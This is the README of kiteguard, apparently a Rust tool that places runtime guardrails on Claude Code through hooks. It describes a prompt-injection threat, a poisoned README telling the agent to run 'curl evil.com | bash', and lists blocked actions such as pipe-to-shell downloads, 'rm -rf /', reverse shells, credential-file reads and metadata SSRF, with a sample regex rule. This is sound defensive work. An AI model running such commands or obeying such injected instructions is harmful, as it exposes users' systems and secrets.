<p align="center">
  <img src="assets/kiteguard.png" alt="kiteguard logo" width="180" />
</p>

<p align="center">
  <em>Runtime security guardrails for Claude Code and AI coding agents</em>
</p>

<p align="center">
  <strong>kiteguard watches every move your AI agent makes — and stops the dangerous ones.</strong>
</p>

[![CI](https://github.com/DhivakaranRavi/kiteguard/actions/workflows/ci.yml/badge.svg)](https://github.com/DhivakaranRavi/kiteguard/actions/workflows/ci.yml)
[![License: MIT OR Apache-2.0](https://img.shields.io/badge/license-MIT%20OR%20Apache--2.0-blue.svg)](LICENSE)
![Built with Rust](https://img.shields.io/badge/built%20with-Rust-orange.svg)

---

## Install

**Option 1 — Install script (quickest):**
```bash
curl -sSL https://raw.githubusercontent.com/DhivakaranRavi/kiteguard/main/scripts/install.sh | bash
```

**Option 2 — Build from source (recommended for security-conscious users):**
```bash
git clone https://github.com/DhivakaranRavi/kiteguard.git
cd kiteguard
cargo build --release
sudo install -m755 target/release/kiteguard /usr/local/bin/kiteguard
kiteguard init
```

> No dependencies beyond a Rust toolchain. Get Rust at [rustup.rs](https://rustup.rs).

---

## Why kiteguard

Claude Code is an agent harness — it autonomously executes shell commands, reads your entire codebase, fetches external URLs, and modifies files without asking for confirmation. That power also means:

- A poisoned README can instruct Claude to run `curl evil.com | bash`
- A web page Claude fetches can contain embedded instructions
- PII in files Claude reads goes straight to the Claude API
- No security team has visibility into what developers are doing with Claude

kiteguard solves this by intercepting at **four critical points** in every Claude Code session — before damage happens.

---

## How it works

```mermaid
graph LR
    DEV["Developer"]
    CC["Claude Code"]

    subgraph KG["KiteGuard"]
        direction TB

        subgraph HL["Hook Layer"]
            H1["UserPromptSubmit\n────────────\nBlock PII &\nprompt injection"]
            H2["PreToolUse\n────────────\nBlock commands,\npaths & URLs"]
            H3["PostToolUse\n────────────\nScan tool\nresponse content"]
            H4["Stop\n────────────\nRedact secrets\n& PII"]
        end

        subgraph CE["Core Engine"]
            PE["Policy Engine\nHMAC-verified rules.json"]
            DET["Detectors\ncommands · paths · URLs\nPII · secrets · injection"]
        end

        LOG["Audit Logger\nSHA-256 hash-chain"]
    end

    subgraph FS["~/.kiteguard/"]
        RF["rules.json + .sig"]
        AK[".key  (HMAC-SHA256)"]
        AL["audit.log"]
    end

    WH["Webhook\n(optional)"]

    DEV        -->|"prompt / tools"|   CC
    CC         -->|"stdin JSON"|       HL
    HL         -->                     PE
    PE         -->                     DET
    DET        -->|"verdict"|          HL
    HL         -->|"block·2 / allow·0"| CC
    CC         -->|"safe response"|    DEV
    HL         -->                     LOG
    PE         -.->|"verify sig"|      RF
    PE         -.->|"read key"|        AK
    LOG        -.->|"append"|          AL
    LOG        -->|"POST"|             WH

    style DEV  fill:#dbeafe,stroke:#3b82f6,color:#1e3a5f
    style CC   fill:#dbeafe,stroke:#3b82f6,color:#1e3a5f
    style KG   fill:#fff7ed,stroke:#f97316
    style HL   fill:#fee2e2,stroke:#ef4444
    style H1   fill:#fee2e2,stroke:#ef4444,color:#7f1d1d
    style H2   fill:#fee2e2,stroke:#ef4444,color:#7f1d1d
    style H3   fill:#fee2e2,stroke:#ef4444,color:#7f1d1d
    style H4   fill:#fee2e2,stroke:#ef4444,color:#7f1d1d
    style CE   fill:#f0fdf4,stroke:#22c55e
    style PE   fill:#f0fdf4,stroke:#22c55e,color:#14532d
    style DET  fill:#f0fdf4,stroke:#22c55e,color:#14532d
    style LOG  fill:#f0fdf4,stroke:#22c55e,color:#14532d
    style FS   fill:#fafaf9,stroke:#78716c
    style RF   fill:#fafaf9,stroke:#78716c,color:#292524
    style AK   fill:#fafaf9,stroke:#78716c,color:#292524
    style AL   fill:#fafaf9,stroke:#78716c,color:#292524
    style WH   fill:#fdf4ff,stroke:#a855f7,color:#581c87
```

---

## What it blocks

| Threat | Hook |
|---|---|
| `curl \| bash`, `wget \| sh` pipe attacks | PreToolUse |
| `rm -rf /`, reverse shells | PreToolUse |
| Reads of `~/.ssh`, `.env`, credentials | PreToolUse |
| Writes to `/etc`, `.claude/settings.json` | PreToolUse |
| SSRF to cloud metadata endpoints | PreToolUse |
| Prompt injection in developer input | UserPromptSubmit |
| PII (SSN, credit cards, emails) in prompts | UserPromptSubmit |
| Injection embedded in files Claude reads | PostToolUse |
| Secrets/API keys echoed in responses | Stop |

---

## Configuration

Works with secure defaults. To customize for your org, create `~/.kiteguard/rules.json`:

```json
{
  "bash": {
    "block_patterns": ["curl[^|]*\\|[^|]*(bash|sh)"]
  },
  "file_paths": {
    "block_read": ["**/.env", "**/.ssh/**"]
  },
  "pii": {
    "block_in_prompt": true,
    "types": ["ssn", "credit_card", "email"]
  },
  "webhook": {
    "enabled": true,
    "url": "https://your-siem.company.com/kiteguard"
  }
}
```

---

## CLI

| Command | Description |
|---|---|
| `kiteguard init` | Register kiteguard hooks with Claude Code |
| `kiteguard audit` | View the local audit log (all events) |
| `kiteguard audit verify` | Verify audit log hash-chain integrity — detects tampering |
| `kiteguard policy` | View active security policies (alias for `policy list`) |
| `kiteguard policy list` | Print all active policy settings |
| `kiteguard policy path` | Print the path to the active `rules.json` file |
| `kiteguard policy sign` | Re-sign `rules.json` after manual edits |
| `kiteguard --version` | Print version |
| `kiteguard --help` | Show help |

---

## Audit log

Every event is logged to `~/.kiteguard/audit.log`:

```
TIMESTAMP                      HOOK                      VERDICT   RULE
2026-03-28T10:23:01Z           PreToolUse                🚫 block  dangerous_command
2026-03-28T10:23:45Z           UserPromptSubmit          ✅ allow
```

---

## Architecture

Built in Rust as a single static binary. No runtime dependencies.

- Hooks dispatch to `src/hooks/` handlers
- Detection logic lives in `src/detectors/`
- Policy engine in `src/engine/`
- Audit logging in `src/audit/`

See [docs/architecture.md](docs/architecture.md) for the full technical design.

---

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md). Issues labeled `good first issue` are a great starting point.

## License

MIT OR Apache-2.0
